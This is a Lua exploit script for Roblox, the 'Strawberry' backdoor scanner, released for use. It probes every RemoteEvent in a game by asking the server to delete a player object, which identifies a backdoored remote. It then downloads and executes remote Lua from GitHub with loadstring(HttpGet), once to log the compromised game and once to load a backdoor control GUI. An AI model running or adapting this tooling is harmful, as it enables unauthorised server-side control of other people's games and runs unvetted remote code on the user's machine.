--[[
⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠁⠀

made by C:\Drive and Saji⠀⠀⠀

C:\Drive - Gui, commands
Saji - Commands, scanner
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
]]--

-- // V4 STRAWBERRY SCANNER
-- // rewrite by saji lolz
-- // my brain was completely destroyed while writing this (no sleep)
-- // chances are im the only one who can understand this alien coding style lol (I CAN, MUAHAHAHAHAHA)
-- // this version scans every remote and has a test
-- // which means theres a 99.99% chance it will detect the correct games

-- // this was Saji's pain and suffering, thanks dude - C:\Drive

local backdoored = false;
local event = nil;
local timer = nil;

local function notif(msg,dur)
	game.StarterGui:SetCore("SendNotification",{
		Title = "Strawberry";
		Text = tostring(msg);
		Duration = dur or 3;
	});
end; -- // notifys the user

notif("Strawberry scanning! (be patient and dont re-execute the script)", 20);

local deletebind = Instance.new("BindableEvent", game.Players.LocalPlayer);
deletebind.Name = "deletebind";
deletebind.Event:Connect(function(item)
	if backdoored == true then
		event:FireServer(item);
	end;
end); -- // delete function that deletes an instance using the backdoored remote

coroutine.wrap(function()
	timer = 0;
	repeat
		timer += 0.01;
		task.wait(0.01);
	until backdoored == true;
end)(); -- // times how long it takes to find the backdoor

local function isbackdoored(event)
	local function deletetest(item)
		event:FireServer(item);
	end;

	local part = game.Players.LocalPlayer.StarterGear;
	local origParent = part.Parent;
	task.wait();
	deletetest(part);
	task.wait(0.2);
	if not part or part.Parent ~= origParent then
		return true; -- Backdoored
	end; -- // checks if part deleted by checking the parent

	return false; -- Not backdoored
end;

local function scan(root)
	if backdoored == true then return end;
	for i, v in pairs(root:GetDescendants()) do
		if v:IsA("RemoteEvent") and v.Parent.Name ~= "RobloxReplicatedStorage" then
			if isbackdoored(v) == true then
				backdoored = true;
				event = v;
				break;
			else end; -- // retry if the remote is not backdoored
		end;
	end;
end; -- // scans the whole game for remote events so we can test them

scan(game.Workspace);
scan(game.ReplicatedStorage);
scan(game.StarterGui);
task.wait();
if backdoored == true then
	notif("Backdoor found in "..tostring(timer).." seconds!", 6);
	notif("Backdoored remote name: "..event.Name, 6);
	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Hook.lua"))(); -- // logs the backdoored game
end; -- // shows user the time and backdoored remote

if not event then
	notif("No backdoor found, sorry :(",5);
end; -- // tells user if the game dev was too smart for a backdoor

repeat task.wait(1.5) until backdoored == true; -- // creates the gui once the game is confirmed to be backdoored

-- // boots up the backdoor gui after the backdoor is found :3
loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/UI_Source/v4.00.lua"))();
